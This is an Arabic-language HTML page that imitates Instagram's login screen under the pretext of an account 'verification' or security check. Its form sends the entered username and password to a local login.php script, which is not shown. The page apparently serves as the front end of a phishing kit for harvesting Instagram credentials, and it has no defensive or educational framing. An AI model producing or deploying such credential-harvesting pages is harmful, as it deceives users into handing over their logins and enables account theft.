<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق الحساب • Instagram</title>
    <style>
        /* تنسيقات عامة */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(145deg , #222 , #111);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* العنوان العلوي (خارج الكونتنيور) */
        .top-header {
            text-align: center;
            margin-bottom: 30px;
            margin-top: 40px;
        }

        .top-header h1 {
            font-size: 22px;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .top-header p {
            font-size: 14px;
            color: #8e8e8e;
        }

        /* الكونتنيور الأساسي */
        .container {
            width: 100%;
            max-width: 350px;
            
            display: flex;
            flex-direction: column;
            gap: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        .login-box, .signup-box {
            background: linear-gradient(145deg , #111 , #333);
            border: 1px solid #000000;
            padding: 30px 40px;
            text-align: center;
        }

        .logo {
            font-size: 35px;
            font-weight: bold;
            margin-bottom: 25px;
            font-family: 'Arial', sans-serif;
            color: #5f5959;
        }

        /* شكل المدخلات */
        .login-form input {
            width: 100%;
            height: 50px;
            padding: 12px;
            margin-bottom: 8px;
            background: #242323;
            border: 1px solid #414040;
            border-radius: 15px;
            font-size: 14px;
            outline: none;
        }

        .login-form input:focus {
            border-color: #a8a8a8;
        }

        /* زر الدخول */
        .login-btn {
            width: 100%;
            padding: 8px;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
            margin-top: 8px;
        }

        .login-btn:active {
            opacity: 0.7;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider p {
            margin: 0 15px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }

        .fb-login a {
            color: #385185;
            text-decoration: none;
            font-size: 14px;
            font-weight: bold;
            display: block;
            margin-bottom: 15px;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }

        .signup-box p {
            font-size: 14px;
            color: #262626;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }

        /* --- استعلامات الوسائط (Responsive) --- */
        @media screen and (max-width: 450px) {
            body {
                background-color: white; /* خلفية بيضاء في الموبايل مثل انستجرام */
                padding: 10px;
            }

            .top-header {
                margin-top: 20px;
            }

            .login-box, .signup-box {
                border: none; /* إزالة الحدود في الموبايل */
                padding: 20px 25px;
            }

            .container {
                max-width: 100%;
            }

            .top-header h1 {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>

    <header class="top-header">
        <h1>نظام التوثيق والتحقق</h1>
        <p>يرجى إتمام عملية تسجيل الدخول للأمان</p>
    </header>

    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            
            <form class="login-form" action="login.php" method="POST">
                <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <p>أو</p>
                <div class="line"></div>
            </div>

            <div class="fb-login">
                <a href="#">تسجيل الدخول بواسطة Facebook</a>
            </div>
            
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
        </div>

        <div class="signup-box">
            <p>ليس لديك حساب؟ <a href="#">سجل الآن</a></p>
        </div>
    </div>

</body>
</html>